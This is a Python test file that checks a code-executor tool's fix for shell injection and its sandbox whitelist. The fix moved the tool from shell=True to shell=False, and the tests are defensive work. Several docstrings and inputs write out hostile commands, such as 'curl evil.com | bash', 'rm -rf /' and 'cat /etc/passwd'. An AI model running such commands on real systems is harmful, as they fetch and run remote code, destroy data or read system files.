"""Security tests for CodeExecutorTool after shell=True -> shell=False fix.

These tests verify that the shell injection vulnerability is closed:
- Commands using shell metacharacters (&&, |, ;) cannot escape the process
- The sandbox whitelist still blocks non-allowed commands
- Malformed commands are handled gracefully (no uncaught exceptions)
- install_package() uses the same safe path

Run: pytest tests/test_security_executor.py -v
"""
import sys
import unittest
from pathlib import Path
from unittest.mock import MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))


class TestCodeExecutorSecurity(unittest.TestCase):

    def setUp(self):
        from tools.code_executor import CodeExecutorTool
        from infrastructure.security_sandbox import SecuritySandbox
        import tempfile
        self.tmpdir = tempfile.mkdtemp()
        self.sandbox = SecuritySandbox(log_path=self.tmpdir)
        self.executor = CodeExecutorTool(sandbox=self.sandbox, timeout=5)

    # ------------------------------------------------------------------
    # Shell injection tests
    # ------------------------------------------------------------------

    def test_shell_injection_via_and_operator_is_blocked(self):
        """'python && curl evil.com | bash' must not execute the second command."""
        result = self.executor.run("python && echo INJECTED")
        # Either blocked by sandbox OR FileNotFoundError because '&&' is not an executable
        self.assertFalse(
            "INJECTED" in result.get("stdout", ""),
            "Shell injection via '&&' produced output — shell=True may still be active",
        )

    def test_shell_injection_via_semicolon_is_blocked(self):
        """'pip install x; rm -rf /' must not execute the second command."""
        result = self.executor.run("pip install requests; echo INJECTED")
        self.assertFalse(
            "INJECTED" in result.get("stdout", ""),
            "Shell injection via ';' produced output — shell=True may still be active",
        )

    def test_shell_injection_via_pipe_is_blocked(self):
        """'python -c ... | bash' must not pipe to bash."""
        result = self.executor.run("python -c 'print(1)' | cat")
        self.assertFalse(
            result.get("success") is True and "INJECTED" in result.get("stdout", ""),
            "Pipe injection produced output",
        )

    # ------------------------------------------------------------------
    # Sandbox whitelist tests
    # ------------------------------------------------------------------

    def test_blocked_pattern_rm_rf_is_rejected(self):
        """Commands matching BLOCKED_PATTERNS must return blocked=True."""
        result = self.executor.run("rm -rf /tmp/test")
        self.assertTrue(
            result.get("blocked") is True,
            "'rm -rf' was not blocked by sandbox",
        )
        self.assertFalse(result.get("success"))

    def test_non_whitelisted_command_is_blocked(self):
        """Commands not in ALLOWED_COMMANDS must be blocked."""
        result = self.executor.run("cat /etc/passwd")
        self.assertTrue(
            result.get("blocked") is True,
            "'cat' command was not blocked — it is not in ALLOWED_COMMANDS",
        )

    def test_whitelisted_command_is_allowed_through_sandbox(self):
        """A whitelisted command must pass sandbox validation (may fail on system)."""
        result = self.executor.run("python --version")
        # blocked must be False (sandbox let it through)
        self.assertFalse(
            result.get("blocked"),
            "'python --version' was incorrectly blocked by sandbox",
        )

    # ------------------------------------------------------------------
    # Error handling tests
    # ------------------------------------------------------------------

    def test_malformed_command_returns_error_dict(self):
        """Unclosed quotes must not raise an exception, return error dict instead."""
        result = self.executor.run("python -c 'unclosed")
        self.assertIsInstance(result, dict)
        self.assertIn("success", result)
        self.assertFalse(result["success"])

    def test_nonexistent_executable_returns_error(self):
        """A command pointing to a non-existent binary must return success=False."""
        # Bypass sandbox to test executor error handling directly
        executor_no_sandbox = __import__(
            "tools.code_executor", fromlist=["CodeExecutorTool"]
        ).CodeExecutorTool(sandbox=None, timeout=5)
        result = executor_no_sandbox.run("nonexistent_binary_xyz --flag")
        self.assertFalse(result["success"])
        self.assertFalse(result.get("blocked"))

    def test_result_always_has_required_keys(self):
        """Every result dict must have stdout, stderr, returncode, success, blocked."""
        required_keys = {"stdout", "stderr", "returncode", "success", "blocked"}
        result = self.executor.run("python --version")
        self.assertTrue(
            required_keys.issubset(result.keys()),
            f"Missing keys: {required_keys - result.keys()}",
        )

    # ------------------------------------------------------------------
    # install_package safety
    # ------------------------------------------------------------------

    def test_install_package_uses_safe_run(self):
        """install_package must delegate to run() and not bypass sandbox."""
        # Use a mock sandbox that records calls
        mock_sandbox = MagicMock()
        mock_sandbox.validate_command.return_value = True

        from tools.code_executor import CodeExecutorTool
        executor = CodeExecutorTool(sandbox=mock_sandbox, timeout=5)
        executor.install_package("requests", manager="pip")

        # validate_command must have been called (sandbox was consulted)
        mock_sandbox.validate_command.assert_called_once()
        call_arg = mock_sandbox.validate_command.call_args[0][0]
        self.assertIn("pip install", call_arg)


if __name__ == "__main__":
    unittest.main()
